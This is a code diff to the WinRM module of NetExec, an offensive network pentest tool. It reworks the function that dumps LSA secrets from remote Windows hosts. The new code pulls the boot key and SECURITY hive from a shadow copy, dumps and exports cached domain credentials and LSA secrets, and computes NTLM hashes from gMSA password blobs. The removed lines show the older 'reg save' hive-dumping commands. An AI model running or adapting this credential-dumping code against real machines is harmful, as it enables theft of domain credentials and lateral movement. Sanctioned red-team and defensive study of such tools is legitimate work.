@@ -1,5 +1,6 @@
 import os
 import re
+import binascii
 import base64
 import contextlib
 import traceback
@@ -12,6 +13,7 @@ import xml.etree.ElementTree as ET
 from pypsrp.exceptions import WSManFaultError
 from pypsrp.wsman import NAMESPACES, SelectorSet
 from pypsrp.client import Client
+from Cryptodome.Hash import MD4
 
 from pypsrp.powershell import PSDataStreams, RunspacePool
 from pypsrp.shell import WinRS
@@ -19,15 +21,15 @@ from termcolor import colored
 
 from dploot.lib.utils import is_guid, is_credfile
 from impacket.dpapi import MasterKeyFile, MasterKey, CredHist, DomainKey, CredentialFile, deriveKeysFromUser, DPAPI_BLOB, CREDENTIAL_BLOB
-from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
+from impacket.examples.secretsdump import LSASecrets, SAMHashes
 from impacket.uuid import bin_to_string
 
 from nxc.config import process_secret, host_info_colors
 from nxc.connection import connection, requires_admin
 from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.logger import highlight
-from nxc.helpers.misc import gen_random_string
 from nxc.protocols.winrm.remoteops import RemoteOperations
+from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
 from nxc.helpers.negotiate_parser import parse_challenge
 from nxc.logger import NXCAdapter
 from nxc.paths import TMP_PATH
@@ -617,37 +619,50 @@ class winrm(connection):
         finally:
             self.remote_ops.finish()
 
+    @requires_admin
     def lsa(self):
-        security_storename = gen_random_string(6)
-        system_storename = gen_random_string(6)
-        dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
-        clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
+        def add_lsa_secret(secret):
+            add_lsa_secret.secrets += 1
+            self.logger.highlight(secret)
+            if "_SC_GMSA_{84A78B8C" in secret:
+                gmsa_id = secret.split("_")[4].split(":")[0]
+                data = bytes.fromhex(secret.split("_")[4].split(":")[1])
+                blob = MSDS_MANAGEDPASSWORD_BLOB()
+                blob.fromString(data)
+                current_password = blob["CurrentPassword"][:-2]
+                ntlm_hash = MD4.new()
+                ntlm_hash.update(current_password)
+                passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
+                self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")
+
+        add_lsa_secret.secrets = 0
         output_filename = self.output_file_template.format(output_folder="lsa")
+
         try:
-            self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
-            self.conn.fetch(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
-            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
-            self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
-        except Exception as e:
-            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
-                self.logger.fail("Failed to dump LSA secrets, it may have been detected by AV or current user is not privileged user")
-            elif hasattr(e, "code") and e.code == 5:
-                self.logger.fail(f"Dump LSA secrets with {self.args.dump_method} failed, please try '--dump-method'")
-            else:
-                self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
-        else:
-            self.logger.display("Dumping LSA secrets")
-            local_operations = LocalOperations(f"{output_filename}.system")
-            boot_key = local_operations.getBootKey()
+            bootkey = self.remote_ops.get_bootkey(output_filename)
+            if bootkey is None:
+                return
+
+            security_hive_path = f"{self.remote_ops.shadow_copy_path}" + r"\Windows\System32\config\SECURITY"
+            if not self.remote_ops.get_file(security_hive_path, f"{output_filename}.security"):
+                self.logger.fail("Could not get the SECURITY hive")
+                return
+
             LSA = LSASecrets(
                 f"{output_filename}.security",
-                boot_key,
+                bootkey,
                 None,
                 isRemote=None,
-                perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
+                perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
             )
+            self.logger.display("Dumping LSA secrets")
             LSA.dumpCachedHashes()
+            LSA.exportCached(output_filename)
             LSA.dumpSecrets()
+            LSA.exportSecrets(output_filename)
+            self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {output_filename + '.secrets'} and {output_filename + '.cached'}")
+        finally:
+            self.remote_ops.finish()
 
     def dpapi(self):
         """
